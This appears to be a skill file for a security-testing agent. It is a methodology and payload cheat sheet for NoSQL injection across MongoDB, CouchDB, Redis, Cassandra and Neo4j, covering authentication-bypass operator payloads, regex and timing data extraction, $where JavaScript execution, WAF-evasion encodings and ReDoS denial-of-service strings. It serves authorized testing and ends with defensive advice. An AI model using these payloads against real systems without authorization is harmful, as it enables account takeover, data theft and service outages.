---
name: nosql-injection
description: NoSQL injection testing covering MongoDB, CouchDB, Redis, Cassandra, and Neo4j attack vectors
category: vulnerabilities
---

# NoSQL INJECTION

> **CRITICAL:** NoSQL injection exploits vulnerabilities in non-relational databases (MongoDB, CouchDB, Redis, Cassandra, etc.) where user input manipulates query logic, operators, or JavaScript execution contexts. Unlike SQL injection, NoSQL attacks often target JSON/BSON structures, query operators, and server-side JavaScript evaluation. Treat every user-controlled input destined for NoSQL queries as untrusted.

## Scope
- Document stores: MongoDB, CouchDB, Couchbase, Amazon DocumentDB
- Key-value stores: Redis, DynamoDB, Memcached
- Wide-column stores: Cassandra, HBase, ScyllaDB
- Graph databases: Neo4j, ArangoDB, Amazon Neptune
- Integration paths: ODMs (Mongoose, Morphia), REST APIs, GraphQL resolvers, serverless functions

## Methodology
1. Identify NoSQL database type from error messages, response patterns, headers, or technology fingerprinting.
2. Determine input format: JSON body, query string, URL path, headers; note how input is parsed and merged into queries.
3. Test operator injection: inject MongoDB operators ($ne, $gt, $regex, $where) or database-specific syntax to alter query logic.
4. Establish extraction channel: boolean-based response diffs, timing via $where/JavaScript, regex-based character extraction, or error messages.
5. Pivot to authentication bypass, data exfiltration, or JavaScript execution depending on database capabilities.

## Injection Surfaces
- JSON body parameters: direct object/operator injection via nested objects or arrays
- Query string: array notation (?username[$ne]=) or JSON-encoded values
- URL path segments: document IDs, collection names in RESTful APIs
- Headers/cookies: session data parsed as JSON, JWT claims used in queries
- GraphQL variables: unvalidated input passed directly to resolvers
- Aggregation pipelines: $match, $lookup, $group stages with user-controlled fields

## Detection Channels
- Operator-based: inject query operators to modify predicate logic; test $gt/$gte/$lt/$lte/$ne/$eq/$in/$nin and $or/$and/$nor
- Boolean-based: compare true/false predicates; diff status codes, body length, specific content; use $regex for extraction
- Timing-based: use $where sleep payloads when server-side JavaScript is enabled; use heavy regex operations for ReDoS-style delays
- Error-based: provoke type errors, invalid operator errors, or JavaScript runtime exceptions; inspect verbose errors

## DBMS Primitives
### MongoDB
- Operators for injection: $ne, $gt, $lt, $gte, $lte, $in, $nin, $or, $and, $regex, $where, $exists, $type
- JavaScript execution: $where clause accepts JavaScript; $function in aggregations (MongoDB 4.4+)
- Version/info: db.version(), db.serverStatus(), db.hostInfo()
- Authentication bypass: {"username": {"$ne": ""}, "password": {"$ne": ""}}
- Regex extraction: {"password": {"$regex": "^a.*"}} iterate to extract full value
- $where JavaScript: {"$where": "this.username == 'admin' && this.password.match(/^a/)"} 
- Aggregation injection: $lookup to access other collections, $out to write results

### CouchDB
- View injection via map/reduce functions (JavaScript execution)
- Mango queries: operator injection similar to MongoDB ($eq, $ne, $gt, $regex, etc.)
- _all_docs, _find endpoints with selector manipulation
- Design document manipulation for persistent code execution

### Redis
- Command injection via protocol manipulation in poorly sanitized inputs
- Lua script injection: EVAL command with user-controlled scripts
- Key enumeration: KEYS *, SCAN with patterns
- Data exfiltration: GET, HGETALL, LRANGE, SMEMBERS
- Config manipulation: CONFIG SET to modify runtime behavior
- File write via RDB: CONFIG SET dir/dbfilename + SAVE (requires privileges)

### Cassandra
- CQL injection: similar to SQL, string concatenation in WHERE clauses
- ALLOW FILTERING abuse for unauthorized data access
- UDF (User Defined Functions) if enabled: Java/JavaScript code execution

### Neo4j
- Cypher injection: MATCH, WHERE, RETURN clause manipulation
- APOC procedures: apoc.load.json, apoc.cypher.run for extended capabilities
- Label/relationship injection to access unauthorized graph nodes

## Authentication Bypass
### MongoDB Operators
- Basic bypass: {"username": "admin", "password": {"$ne": ""}}
- Always true: {"username": {"$gt": ""}, "password": {"$gt": ""}}
- Regex wildcard: {"username": "admin", "password": {"$regex": ".*"}}
- $or injection: {"$or": [{"username": "admin"}, {"admin": true}], "password": {"$ne": ""}}
- Type coercion: {"username": "admin", "password": {"$type": 2}} (type 2 = string)

### Query String Injection
- Array notation: ?username=admin&password[$ne]=wrongpass
- Nested operators: ?user[username]=admin&user[password][$gt]=
- URL-encoded JSON: ?filter=%7B%22username%22%3A%7B%22%24ne%22%3Anull%7D%7D

## Data Extraction
### Regex Extraction
- Character-by-character: iterate {"field": {"$regex": "^X"}} for each position
- Binary search: use character ranges [a-m] vs [n-z] to reduce requests
- Case sensitivity: use $options: "i" for case-insensitive matching
- Special chars: escape regex metacharacters (. * + ? ^ $ { } [ ] \ | ( ))

### Boolean Extraction
- Use $regex or $where to create true/false conditions
- Diff response length, status code, specific strings, or timing
- Extract field names via $exists: {"unknownField": {"$exists": true}}

### JavaScript Extraction
- $where with conditional: {"$where": "if(this.password[0]=='a'){sleep(5000)}"}
- Access Object.keys(): {"$where": "Object.keys(this)[0][0]=='u'"} to enumerate fields
- String operations: substring, charAt for positional extraction

### Aggregation Based
- $lookup to join with other collections and leak data
- $match with injected operators
- $project to select fields, $group to aggregate sensitive data

## JavaScript Injection
### $where Clause
- MongoDB $where executes JavaScript on the server; requires server-side JavaScript enabled (often disabled via --noscripting/security.javascriptEnabled)
- Basic: {"$where": "1==1"} or {"$where": "true"}
- Sleep for timing: {"$where": "sleep(5000) || true"}
- Data access: {"$where": "this.password.length > 5"}
- External calls (if allowed): {"$where": "this.constructor.constructor('return fetch(...)')()"}

### $function Operator
- MongoDB 4.4+ $function in aggregation: {"$function": {"body": "function(){...}", "args": [], "lang": "js"}}
- Server-side JavaScript must be enabled (not disabled via --noscripting)

### MapReduce
- Inject into map/reduce functions if user input reaches these contexts
- CouchDB views: JavaScript in map functions

## ODM & Framework Issues
### Mongoose
- Dangerous patterns: find(req.body), findOne(req.query) without sanitization
- $where passthrough: user input reaching $where conditions
- Population/reference injection: manipulating $lookup-like operations
- Schema bypass: __proto__, constructor pollution via JSON parsing

### Morphia (Java)
- String concatenation in filters instead of parameterized queries
- Criteria API misuse with raw strings

### PyMongo
- eval() usage with user input (deprecated but still dangerous)
- find() with unsanitized dictionaries from JSON input
- Codec manipulation affecting serialization

## WAF & Filter Bypasses
### Encoding Tricks
- URL encoding: %24ne instead of $ne
- Double encoding: %2524ne
- Unicode normalization: using different Unicode representations
- JSON unicode escapes: \u0024ne for $ne

### Operator Alternatives
- $not instead of $ne: {"field": {"$not": {"$eq": "value"}}}
- $nin instead of $ne: {"field": {"$nin": ["wrong"]}}
- $expr with $eq/$ne in aggregation context

### Structure Manipulation
- Nested objects vs flat: {"a.b": "c"} vs {"a": {"b": "c"}}
- Array injection: ["$or", ...] in systems parsing arrays as operators
- Prototype pollution: __proto__, constructor.prototype in JSON

### Comment Injection
- MongoDB shell: // or /* */ in JavaScript contexts
- Newline injection in string concatenation scenarios

## Blind Extraction
### Binary Search
- Use $regex with character ranges: ^[a-m] vs ^[n-z]
- Reduce character space: alphanumeric, then specific ranges
- Position tracking: ^known_prefix[a-m] for next character

### Timing Oracle
- $where with conditional sleep: if(condition){sleep(N)}
- ReDoS via pathological regex: ((a+)+)$ with long input
- Heavy operations: sorting large datasets conditionally

### Response Differential
- Track: status codes (200/401/403/500), body length, specific strings, JSON structure
- Normalize responses (hash/length) to reduce noise
- Account for caching and rate limiting affecting responses

## Server-Side Injection
### SSJS (MongoDB)
- Server-Side JavaScript (SSJS) when $where, $function, mapReduce are exposed
- Potential for: DoS (infinite loops), data access, limited RCE depending on config
- Check: db.adminCommand({getParameter: 1, javascriptEnabled: 1})

### DoS Attacks
- ReDoS: {"field": {"$regex": "^(a+)+$"}} against long strings
- Resource exhaustion: large $in arrays, complex aggregations
- Infinite loops in $where if SSJS is enabled without timeouts

## GraphQL + NoSQL
- Variables passed directly to MongoDB queries: query { user(filter: $input) }
- Operator injection via GraphQL variables: {"filter": {"password": {"$ne": ""}}}
- Batching attacks: multiple queries to enumerate data
- Introspection combined with injection for schema-aware attacks

## Validation
1. Demonstrate operator injection alters query behavior (auth bypass, extra data returned).
2. Show boolean/timing/error oracle confirms control over query predicates.
3. Extract verifiable data: version info, field names, partial sensitive values.
4. Provide minimal reproducible requests with clear injection points.
5. Document database type and version; defenses vary significantly across NoSQL systems.

## False Positives
- Strong typing/schema validation rejecting operator objects
- ODM sanitization stripping $ prefixes from keys
- Parameterized queries where operators cannot be injected
- WAF blocking all $ operators (verify with encoding bypasses first)
- Application logic unrelated to database predicates causing response variations

## Impact
- Authentication and authorization bypass via manipulated query predicates
- Mass data exfiltration through regex extraction or aggregation manipulation
- Server-side JavaScript execution leading to DoS or limited RCE
- Privilege escalation by modifying user roles/permissions in database
- Denial of service via ReDoS or resource-intensive queries

## Pro Tips
1. Start with $ne and $gt operators—they're most commonly injectable and easy to detect.
2. Use boolean oracles first; timing channels are noisier and slower.
3. For MongoDB, always test both JSON body and query string injection vectors.
4. $regex is powerful for extraction but escape special characters properly.
5. Check if SSJS is enabled before investing time in $where payloads.
6. Aggregation pipelines often have weaker validation than simple find() queries.
7. GraphQL + MongoDB is a common vulnerable combination; test variable injection.
8. Monitor for ReDoS potential—useful for both detection and responsible DoS impact assessment.
9. ODMs don't guarantee safety; audit raw query patterns and merge operations.
10. Different NoSQL databases have vastly different capabilities; tailor payloads to the target.

> **Remember:** NoSQL injection succeeds where applications trust user input structure, not just values. Validate that input types match expectations, strip or reject query operators from user data, and use ODM features that enforce schemas. The absence of SQL syntax does not mean the absence of injection risk.
